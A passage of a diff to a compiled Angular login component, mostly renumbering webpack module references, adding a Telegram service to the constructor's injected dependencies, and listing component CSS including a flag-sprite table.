+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()()();
   }
   if (rf & 2) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("@slideIn", undefined);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("@slideIn", undefined);
   }
 }
 function LoginComponent_div_8_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelement"](0, "div", 33);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelement"](0, "div", 33);
   }
 }
 function LoginComponent_div_10_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "div", 34)(1, "div", 35)(2, "div", 36);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelement"](3, "div", 37);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](4, "div", 38)(5, "mat-icon", 39);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](6, "close");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()()()()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "div", 34)(1, "div", 35)(2, "div", 36);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelement"](3, "div", 37);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](4, "div", 38)(5, "mat-icon", 39);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](6, "close");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()()()()();
   }
 }
 class LoginComponent {
-  constructor(plus, authSV, fb, formSV) {
+  constructor(plus, authSV, fb, formSV, teleSV) {
     this.plus = plus;
     this.authSV = authSV;
     this.fb = fb;
     this.formSV = formSV;
+    this.teleSV = teleSV;
     this.photoUrl = localStorage.getItem('avatar');
     this.api = "user";
     this.spin = true;
@@ -494,10 +497,10 @@ class LoginComponent {
     this.isInStandaloneMode = false;
     this.isGoogleBlocked = false;
     this.main = this.fb.group({
-      phoneNumber: ['', [this.formSV.regex_integer(), _angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.minLength(10), _angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.required]],
-      phoneNumberCode: ['84', [_angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.minLength(2), _angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.maxLength(6), _angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.required]],
-      fullName: ['', [_angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.minLength(2), _angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.maxLength(255), _angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.required]],
-      otpCode: ['', [_angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.minLength(6), _angular_forms__WEBPACK_IMPORTED_MODULE_9__.Validators.maxLength(6)]]
+      phoneNumber: ['', [this.formSV.regex_integer(), _angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.minLength(10), _angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.required]],
+      phoneNumberCode: ['84', [_angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.minLength(2), _angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.maxLength(6), _angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.required]],
+      fullName: ['', [_angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.minLength(2), _angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.maxLength(255), _angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.required]],
+      otpCode: ['', [_angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.minLength(6), _angular_forms__WEBPACK_IMPORTED_MODULE_10__.Validators.maxLength(6)]]
     });
   }
   ngOnDestroy() {
@@ -561,11 +564,11 @@ class LoginComponent {
   }
   static {
     this.ɵfac = function LoginComponent_Factory(t) {
-      return new (t || LoginComponent)(_angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵdirectiveInject"](_share_services_plus_service__WEBPACK_IMPORTED_MODULE_2__.PlusService), _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵdirectiveInject"](_share_services_authV2_service__WEBPACK_IMPORTED_MODULE_3__.AuthServiceV2), _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵdirectiveInject"](_angular_forms__WEBPACK_IMPORTED_MODULE_9__.FormBuilder), _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵdirectiveInject"](_share_services_form_service__WEBPACK_IMPORTED_MODULE_4__.FormService));
+      return new (t || LoginComponent)(_angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵdirectiveInject"](_share_services_plus_service__WEBPACK_IMPORTED_MODULE_2__.PlusService), _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵdirectiveInject"](_share_services_authV2_service__WEBPACK_IMPORTED_MODULE_3__.AuthServiceV2), _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵdirectiveInject"](_angular_forms__WEBPACK_IMPORTED_MODULE_10__.FormBuilder), _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵdirectiveInject"](_share_services_form_service__WEBPACK_IMPORTED_MODULE_4__.FormService), _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵdirectiveInject"](_share_services_telegram_service__WEBPACK_IMPORTED_MODULE_5__.TelegramService));
     };
   }
   static {
-    this.ɵcmp = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵdefineComponent"]({
+    this.ɵcmp = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵdefineComponent"]({
       type: LoginComponent,
       selectors: [["app-login"]],
       decls: 11,
@@ -573,31 +576,31 @@ class LoginComponent {
       consts: [[1, "container"], [1, "row"], [1, "outer"], ["class", "block", 4, "ngFor", "ngForOf"], ["class", "row my-5 justify-content-center", 4, "ngIf", "ngIfElse"], ["showLogin", ""], [1, "login-container"], ["id", "googleBtnFallback", 4, "ngIf"], ["class", "modal fade", "id", "qrUserId", "tabindex", "-1", "role", "dialog", "aria-labelledby", "modelTitleId", "aria-hidden", "true", 4, "ngIf"], [1, "block"], [3, "routerLink"], [1, "img", 3, "src", "alt", "matTooltip"], ["label", ""], [1, "labelIcon", 3, "matTooltip"], [1, "row", "my-5", "justify-content-center"], [1, "col-md-8"], [1, "card"], [1, "text-right"], ["class", "card hangHoa", "routerLink", "/taikhoan", 4, "ngIf"], [1, "list-group"], ["class", "list-group-item", 4, "ngIf"], [1, "list-group-item"], ["mat-raised-button", "", "matTooltip", "C\u00E0i \u0111\u1EB7t", "color", "accent", 3, "click", 4, "ngIf"], [1, "text-center"], ["mat-raised-button", "", "matTooltip", "\u0110\u0103ng xu\u1EA5t", "color", "warn", 3, "click"], ["fontSet", "material-icons-round"], [4, "ngIf"], ["routerLink", "/taikhoan", 1, "card", "hangHoa"], ["height", "100px", "width", "100px", 1, "justify-content-center", 3, "src", "matTooltip"], ["mat-raised-button", "", "matTooltip", "C\u00E0i \u0111\u1EB7t", "color", "accent", 3, "click"], [1, "col-lg-6", "mx-auto"], [1, "card", "card-signin", "text-center"], [1, "card-title", "text-center", "text-danger", "py-1"], ["id", "googleBtnFallback"], ["id", "qrUserId", "tabindex", "-1", "role", "dialog", "aria-labelledby", "modelTitleId", "aria-hidden", "true", 1, "modal", "fade"], ["role", "document", 1, "modal-dialog", "modal-sm"], [1, "modal-content"], [1, "modal-body", "text-center"], [1, "modal-footer"], ["data-bs-dismiss", "modal"]],
       template: function LoginComponent_Template(rf, ctx) {
         if (rf & 1) {
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "div", 0)(1, "div", 1)(2, "div", 2);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](3, LoginComponent_div_3_Template, 5, 5, "div", 3);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](4, LoginComponent_div_4_Template, 25, 9, "div", 4);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](5, LoginComponent_ng_template_5_Template, 9, 1, "ng-template", null, 5, _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplateRefExtractor"]);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]();
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](7, "div", 6);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](8, LoginComponent_div_8_Template, 1, 0, "div", 7);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]();
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelement"](9, "app-footer");
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](10, LoginComponent_div_10_Template, 7, 0, "div", 8);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "div", 0)(1, "div", 1)(2, "div", 2);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](3, LoginComponent_div_3_Template, 5, 5, "div", 3);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](4, LoginComponent_div_4_Template, 25, 9, "div", 4);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](5, LoginComponent_ng_template_5_Template, 9, 1, "ng-template", null, 5, _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplateRefExtractor"]);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]();
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](7, "div", 6);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](8, LoginComponent_div_8_Template, 1, 0, "div", 7);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]();
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelement"](9, "app-footer");
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](10, LoginComponent_div_10_Template, 7, 0, "div", 8);
         }
         if (rf & 2) {
-          const _r2 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵreference"](6);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](3);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngForOf", ctx.navUser);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](1);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx.user)("ngIfElse", _r2);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](4);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx.isGoogleBlocked);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](2);
-          _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx.user);
+          const _r2 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵreference"](6);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](3);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngForOf", ctx.navUser);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](1);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx.user)("ngIfElse", _r2);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](4);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx.isGoogleBlocked);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](2);
+          _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx.user);
         }
       },
-      dependencies: [_angular_common__WEBPACK_IMPORTED_MODULE_10__.NgForOf, _angular_common__WEBPACK_IMPORTED_MODULE_10__.NgIf, _angular_router__WEBPACK_IMPORTED_MODULE_11__.RouterLink, _angular_material_button__WEBPACK_IMPORTED_MODULE_12__.MatButton, _angular_material_icon__WEBPACK_IMPORTED_MODULE_13__.MatIcon, _angular_material_tooltip__WEBPACK_IMPORTED_MODULE_14__.MatTooltip, _share_account_login_google_login_google_component__WEBPACK_IMPORTED_MODULE_5__.LoginGoogleComponent, _site_footer_footer_component__WEBPACK_IMPORTED_MODULE_6__.FooterComponent, _zalo_zalo_component__WEBPACK_IMPORTED_MODULE_7__.ZaloComponent, _angular_common__WEBPACK_IMPORTED_MODULE_10__.TitleCasePipe],
+      dependencies: [_angular_common__WEBPACK_IMPORTED_MODULE_11__.NgForOf, _angular_common__WEBPACK_IMPORTED_MODULE_11__.NgIf, _angular_router__WEBPACK_IMPORTED_MODULE_12__.RouterLink, _angular_material_button__WEBPACK_IMPORTED_MODULE_13__.MatButton, _angular_material_icon__WEBPACK_IMPORTED_MODULE_14__.MatIcon, _angular_material_tooltip__WEBPACK_IMPORTED_MODULE_15__.MatTooltip, _share_account_login_google_login_google_component__WEBPACK_IMPORTED_MODULE_6__.LoginGoogleComponent, _site_footer_footer_component__WEBPACK_IMPORTED_MODULE_7__.FooterComponent, _zalo_zalo_component__WEBPACK_IMPORTED_MODULE_8__.ZaloComponent, _angular_common__WEBPACK_IMPORTED_MODULE_11__.TitleCasePipe],
       styles: [".menubtn[_ngcontent-%COMP%] {\n  position: fixed;\n  top: 5px;\n  right: 9px;\n  z-index: 99;\n  color: blue;\n  \n\n  \n\n  \n\n\n}\n\n.login-aside[_ngcontent-%COMP%] {\n  animation: fadein 2.25s ease-in-out;\n  flex: 3 3;\n  display: flex;\n  justify-content: flex-end;\n  flex-flow: column;\n  min-height: 100%;\n  border-radius: 0 10px 10px 0;\n  background: url(\"https://source.unsplash.com/random/1200x900?mountain\") no-repeat center center;\n  background-size: cover;\n  position: relative;\n}\n[_ngcontent-%COMP%]:root {\n  --input-padding-x: 1.5rem;\n  --input-padding-y: .75rem;\n}\n\n\n.element.style[_ngcontent-%COMP%] {\n  height: 46px;\n  width: 267px;\n}\n\nbody[_ngcontent-%COMP%] {\n  background: #007bff;\n  background: linear-gradient(to right, #0062E6, #33AEFF);\n}\n\n.card-signin[_ngcontent-%COMP%] {\n  border: 0;\n  border-radius: 1rem;\n  box-shadow: 0 0.5rem 1rem 0 rgba(0, 0, 0, 0.1);\n}\n\n.card-signin[_ngcontent-%COMP%]   .card-title[_ngcontent-%COMP%] {\n  margin-bottom: 2rem;\n  font-weight: 300;\n  font-size: 1.5rem;\n}\n\n.card-signin[_ngcontent-%COMP%]   .card-body[_ngcontent-%COMP%] {\n  padding: 2rem;\n}\n\n.form-signin[_ngcontent-%COMP%] {\n  width: 100%;\n}\n\n.form-signin[_ngcontent-%COMP%]   .btn[_ngcontent-%COMP%] {\n  font-size: 80%;\n  border-radius: 5rem;\n  letter-spacing: .1rem;\n  font-weight: bold;\n  padding: 1rem;\n  transition: all 0.2s;\n}\n\n.form-label-group[_ngcontent-%COMP%] {\n  position: relative;\n  margin-bottom: 1rem;\n  padding: 2rem;\n}\n\n.form-label-group[_ngcontent-%COMP%]   input[_ngcontent-%COMP%] {\n  height: auto;\n  border-radius: 2rem;\n}\n\n.form-label-group[_ngcontent-%COMP%] > input[_ngcontent-%COMP%], .form-label-group[_ngcontent-%COMP%] > label[_ngcontent-%COMP%] {\n  padding: var(--input-padding-y) var(--input-padding-x);\n}\n\n.form-label-group[_ngcontent-%COMP%] > label[_ngcontent-%COMP%] {\n  position: absolute;\n  top: 0;\n  left: 0;\n  display: block;\n  width: 100%;\n  margin-bottom: 0;\n  \n\n  line-height: 1.5;\n  color: #495057;\n  border: 1px solid transparent;\n  border-radius: .25rem;\n  transition: all .1s ease-in-out;\n}\n\n.form-label-group[_ngcontent-%COMP%]   input[_ngcontent-%COMP%]::placeholder {\n  color: transparent;\n}\n\n.form-label-group[_ngcontent-%COMP%]   input[_ngcontent-%COMP%]:not(:placeholder-shown) {\n  padding-top: calc(var(--input-padding-y) + var(--input-padding-y) * (2 / 3));\n  padding-bottom: calc(var(--input-padding-y) / 3);\n}\n\n.form-label-group[_ngcontent-%COMP%]   input[_ngcontent-%COMP%]:not(:placeholder-shown) ~ label[_ngcontent-%COMP%] {\n  padding-top: calc(var(--input-padding-y) / 3);\n  padding-bottom: calc(var(--input-padding-y) / 3);\n  font-size: 12px;\n  color: #777;\n}\n\n.btn-google[_ngcontent-%COMP%] {\n  color: white;\n  background-color: rgb(209, 80, 80);\n}\n\n.btn-facebook[_ngcontent-%COMP%] {\n  color: white;\n  background-color: rgb(56, 56, 168);\n  border: 1px;\n}\n\n.btn-zalo[_ngcontent-%COMP%] {\n  color: blue;\n  padding: 5px !important;\n  background-color: rgb(173, 209, 241);\n  border: 1px;\n  font-size: larger;\n}\n\n\n\n\n@supports (-ms-ime-align: auto) {\n  .form-label-group[_ngcontent-%COMP%] > label[_ngcontent-%COMP%] {\n    display: none;\n  }\n  .form-label-group[_ngcontent-%COMP%]   input[_ngcontent-%COMP%]::-ms-input-placeholder {\n    color: #777;\n  }\n}\n\n\n\n\n\n@media all and (-ms-high-contrast: none),\n(-ms-high-contrast: active) {\n  .form-label-group[_ngcontent-%COMP%] > label[_ngcontent-%COMP%] {\n    display: none;\n  }\n  .form-label-group[_ngcontent-%COMP%]   input[_ngcontent-%COMP%]:-ms-input-placeholder {\n    color: #777;\n  }\n}\n\n.img[_ngcontent-%COMP%]{\n  width: 60px;\n  height: 60px;\n  z-index: 1;\n  position:relative\n}\n\n.labelIcon[_ngcontent-%COMP%] {\n  position: static;\n  z-index: 3;\n}\n\n.outer[_ngcontent-%COMP%] {\n    text-align:center;\n    width: 100%;\n    margin-left: auto;\n    margin-right: auto;\n}\n\n.block[_ngcontent-%COMP%] {\n  width: 5rem;\n  height: 5rem;\n  \n\n  display: inline-block;\n  margin: 0.6rem;\n  padding: 0.5rem;\n  \n\n\n  border: solid .05rem #777;\n  align-items: center;\n  background-color: white;\n  border-radius: 1rem;\n}\n\n.block[_ngcontent-%COMP%]:hover {\n  border-width: .3rem;\n  border-color: blue;\n  transform: scale(1.1);\n}\n\n\n\n.hangHoa[_ngcontent-%COMP%] {\n  height: 5rem;\n  width: 5rem;\n  border-radius: 1rem;\n  margin: 0.6rem;\n  padding: 0.5rem;\n  border-width: .1rem;\n  border-color: blue;\n  align-items: center;\n  justify-content: center;\n  color: tomato;\n  background-color: white;\n\n}\n\n.hangHoa[_ngcontent-%COMP%]:hover {\n  border-width: .3rem;\n  border-color: blue;\n  transform: scale(1.1);\n}\n\nimg[_ngcontent-%COMP%] {\n  font-family: 'Helvetica';\n  font-weight: 300;\n  line-height: 2;\n  text-align: center;\n\n  width: 100%;\n  height: auto;\n  display: block;\n  position: relative;\n}\n\nimg[_ngcontent-%COMP%]:after {\n  content: attr(alt);\n  \n\n  font-family: Roboto;\n  color: tomato;\n  font-weight: bold;\n  align-items: center;\n  justify-content: center;\n  display: block;\n  position: absolute;\n  z-index: 2;\n  top: 0;\n  left: 0;\n  width: 100%;\n  height: 100%;\n  background-color: #fff;\n}\n\n\n\n\n.containerx[_ngcontent-%COMP%] {\n  position: relative;\n  overflow: hidden;\n  width: 100%;\n  padding-top: 56.25%; \n\n}\n\n\n\n.responsive-iframe[_ngcontent-%COMP%] {\n  position: absolute;\n  top: 0;\n  left: 0;\n  bottom: 0;\n  right: 0;\n  width: 100%;\n  height: 100%;\n}\n\n.flag[_ngcontent-%COMP%] {\n    width: 20px;\n    height: 16px;\n    margin-right: 0.3em;\n    display: inline-block;\n}\n\n\n\n\n\n\n.cap[_ngcontent-%COMP%] {\n      display: flex;\n    align-items: center;\n    justify-content: center;\n}\n\n#recaptcha-container[_ngcontent-%COMP%]{\n  \n\n  \n\n\n\n  \n\n  \n\n  display: flex;\n  align-items: center\n}\n\n\n.f32[_ngcontent-%COMP%]   .flag[_ngcontent-%COMP%]{display:inline-block;height:32px;width:32px;vertical-align:text-top;line-height:32px;background:url(https://github.com/lafeber/world-flags-sprite/raw/master/images/flags32.png) no-repeat;}\n.f32[_ngcontent-%COMP%]   ._African_Union[_ngcontent-%COMP%]{background-position:0 -32px;}\n.f32[_ngcontent-%COMP%]   ._Arab_League[_ngcontent-%COMP%]{background-position:0 -64px;}\n.f32[_ngcontent-%COMP%]   ._ASEAN[_ngcontent-%COMP%]{background-position:0 -96px;}\n.f32[_ngcontent-%COMP%]   ._CARICOM[_ngcontent-%COMP%]{background-position:0 -128px;}\n.f32[_ngcontent-%COMP%]   ._CIS[_ngcontent-%COMP%]{background-position:0 -160px;}\n.f32[_ngcontent-%COMP%]   ._Commonwealth[_ngcontent-%COMP%]{background-position:0 -192px;}\n.f32[_ngcontent-%COMP%]   ._England[_ngcontent-%COMP%]{background-position:0 -224px;}\n.f32[_ngcontent-%COMP%]   ._European_Union[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .eu[_ngcontent-%COMP%]{background-position:0 -256px;}\n.f32[_ngcontent-%COMP%]   ._Islamic_Conference[_ngcontent-%COMP%]{background-position:0 -288px;}\n.f32[_ngcontent-%COMP%]   ._Kosovo[_ngcontent-%COMP%]{background-position:0 -320px;}\n.f32[_ngcontent-%COMP%]   ._NATO[_ngcontent-%COMP%]{background-position:0 -352px;}\n.f32[_ngcontent-%COMP%]   ._Northern_Cyprus[_ngcontent-%COMP%]{background-position:0 -384px;}\n.f32[_ngcontent-%COMP%]   ._Northern_Ireland[_ngcontent-%COMP%]{background-position:0 -416px;}\n.f32[_ngcontent-%COMP%]   ._Olimpic_Movement[_ngcontent-%COMP%]{background-position:0 -448px;}\n.f32[_ngcontent-%COMP%]   ._OPEC[_ngcontent-%COMP%]{background-position:0 -480px;}\n.f32[_ngcontent-%COMP%]   ._Red_Cross[_ngcontent-%COMP%]{background-position:0 -512px;}\n.f32[_ngcontent-%COMP%]   ._Scotland[_ngcontent-%COMP%]{background-position:0 -544px;}\n.f32[_ngcontent-%COMP%]   ._Somaliland[_ngcontent-%COMP%]{background-position:0 -576px;}\n.f32[_ngcontent-%COMP%]   ._Tibet[_ngcontent-%COMP%]{background-position:0 -608px;}\n.f32[_ngcontent-%COMP%]   ._United_Nations[_ngcontent-%COMP%]{background-position:0 -640px;}\n.f32[_ngcontent-%COMP%]   ._Wales[_ngcontent-%COMP%]{background-position:0 -672px;}\n.f32[_ngcontent-%COMP%]   .ad[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .and[_ngcontent-%COMP%] {background-position: 0 -704px;}\n.f32[_ngcontent-%COMP%]   .ae[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .are[_ngcontent-%COMP%] {background-position: 0 -736px;}\n.f32[_ngcontent-%COMP%]   .af[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .afg[_ngcontent-%COMP%] {background-position: 0 -768px;}\n.f32[_ngcontent-%COMP%]   .ag[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .atg[_ngcontent-%COMP%] {background-position: 0 -800px;}\n.f32[_ngcontent-%COMP%]   .ai[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .aia[_ngcontent-%COMP%] {background-position: 0 -832px;}\n.f32[_ngcontent-%COMP%]   .al[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .alb[_ngcontent-%COMP%] {background-position: 0 -864px;}\n.f32[_ngcontent-%COMP%]   .am[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .arm[_ngcontent-%COMP%] {background-position: 0 -896px;}\n.f32[_ngcontent-%COMP%]   .ao[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ago[_ngcontent-%COMP%] {background-position: 0 -928px;}\n.f32[_ngcontent-%COMP%]   .aq[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ata[_ngcontent-%COMP%] {background-position: 0 -960px;}\n.f32[_ngcontent-%COMP%]   .ar[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .arg[_ngcontent-%COMP%] {background-position: 0 -992px;}\n.f32[_ngcontent-%COMP%]   .as[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .asm[_ngcontent-%COMP%] {background-position: 0 -1024px;}\n.f32[_ngcontent-%COMP%]   .at[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .aut[_ngcontent-%COMP%] {background-position: 0 -1056px;}\n.f32[_ngcontent-%COMP%]   .au[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .aus[_ngcontent-%COMP%] {background-position: 0 -1088px;}\n.f32[_ngcontent-%COMP%]   .aw[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .abw[_ngcontent-%COMP%] {background-position: 0 -1120px;}\n.f32[_ngcontent-%COMP%]   .ax[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ala[_ngcontent-%COMP%] {background-position: 0 -1152px;}\n.f32[_ngcontent-%COMP%]   .az[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .aze[_ngcontent-%COMP%] {background-position: 0 -1184px;}\n.f32[_ngcontent-%COMP%]   .ba[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bih[_ngcontent-%COMP%] {background-position: 0 -1216px;}\n.f32[_ngcontent-%COMP%]   .bb[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .brb[_ngcontent-%COMP%] {background-position: 0 -1248px;}\n.f32[_ngcontent-%COMP%]   .bd[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bgd[_ngcontent-%COMP%] {background-position: 0 -1280px;}\n.f32[_ngcontent-%COMP%]   .be[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bel[_ngcontent-%COMP%] {background-position: 0 -1312px;}\n.f32[_ngcontent-%COMP%]   .bf[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bfa[_ngcontent-%COMP%] {background-position: 0 -1344px;}\n.f32[_ngcontent-%COMP%]   .bg[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bgr[_ngcontent-%COMP%] {background-position: 0 -1376px;}\n.f32[_ngcontent-%COMP%]   .bh[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bhr[_ngcontent-%COMP%] {background-position: 0 -1408px;}\n.f32[_ngcontent-%COMP%]   .bi[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bdi[_ngcontent-%COMP%] {background-position: 0 -1440px;}\n.f32[_ngcontent-%COMP%]   .bj[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .ben[_ngcontent-%COMP%] {background-position: 0 -1472px;}\n.f32[_ngcontent-%COMP%]   .bm[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bmu[_ngcontent-%COMP%] {background-position: 0 -1504px;}\n.f32[_ngcontent-%COMP%]   .bn[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .brn[_ngcontent-%COMP%] {background-position: 0 -1536px;}\n.f32[_ngcontent-%COMP%]   .bo[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bol[_ngcontent-%COMP%] {background-position: 0 -1568px;}\n.f32[_ngcontent-%COMP%]   .br[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bra[_ngcontent-%COMP%] {background-position: 0 -1600px;}\n.f32[_ngcontent-%COMP%]   .bs[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bhs[_ngcontent-%COMP%] {background-position: 0 -1632px;}\n.f32[_ngcontent-%COMP%]   .bt[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .btn[_ngcontent-%COMP%] {background-position: 0 -1664px;}\n.f32[_ngcontent-%COMP%]   .bw[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .bwa[_ngcontent-%COMP%] {background-position: 0 -1696px;}\n.f32[_ngcontent-%COMP%]   .by[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .blr[_ngcontent-%COMP%] {background-position: 0 -1728px;}\n.f32[_ngcontent-%COMP%]   .bz[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .blz[_ngcontent-%COMP%] {background-position: 0 -1760px;}\n.f32[_ngcontent-%COMP%]   .ca[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .can[_ngcontent-%COMP%] {background-position: 0 -1792px;}\n.f32[_ngcontent-%COMP%]   .cd[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .cod[_ngcontent-%COMP%] {background-position: 0 -1824px;}\n.f32[_ngcontent-%COMP%]   .cf[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .rca[_ngcontent-%COMP%] {background-position: 0 -1856px;}\n.f32[_ngcontent-%COMP%]   .cg[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .cog[_ngcontent-%COMP%] {background-position: 0 -1888px;}\n.f32[_ngcontent-%COMP%]   .ch[_ngcontent-%COMP%], .f32[_ngcontent-%COMP%]   .che[_ngcontent-%COMP%] {background-position: 0 -1920px;}\n.f32[_ngcontent-%COMP%]   .ci[_ngcontent-%COMP%], 